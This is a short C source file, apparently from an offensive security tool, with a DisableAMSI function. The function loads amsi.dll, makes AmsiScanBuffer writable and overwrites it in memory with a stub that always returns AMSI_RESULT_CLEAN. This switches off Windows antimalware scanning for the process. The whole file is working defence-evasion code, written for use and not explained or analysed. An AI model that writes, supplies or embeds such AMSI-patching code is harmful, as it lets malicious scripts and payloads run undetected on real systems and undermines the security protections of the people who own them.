#include <Windows.h>
#include <amsi.h>
#include <stdio.h>

#include "Message.h"

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
static HRESULT AmsiScanBufferStub(HAMSICONTEXT amsiContext,PVOID buffer,ULONG length,LPCWSTR contentName,
	HAMSISESSION amsiSession, AMSI_RESULT* result) {
	*result = AMSI_RESULT_CLEAN;
	return S_OK;
}

static VOID AmsiScanBufferStubEnd(VOID) {}


BOOL DisableAMSI(VOID) {
	// load amsi
	HMODULE amsiLib = LoadLibraryA("amsi");

	if (amsiLib != NULL) {
		// resolve address of function to patch
		LPVOID AmsiScanBufferF = GetProcAddress(amsiLib, "AmsiScanBuffer");

		if (AmsiScanBufferF != NULL) {
			DWORD   oldProtect, t;
			// calculate length of stub
			DWORD len = (DWORD)((ULONG_PTR)AmsiScanBufferStubEnd - (ULONG_PTR)AmsiScanBufferStub);

			// make the memory writeable
			if (VirtualProtect(AmsiScanBufferF, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
				// over write with code stub
				memcpy(AmsiScanBufferF, &AmsiScanBufferStub, len);
				// set back to original protection
				VirtualProtect(AmsiScanBufferF, len, oldProtect, &t);
				printMsg(STATUS_OK, LEVEL_DEFAULT, "Succefully patch AMSI !\n");
				return TRUE;
			}
		}
	}
	printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to patch AMSI");
	return FALSE;
}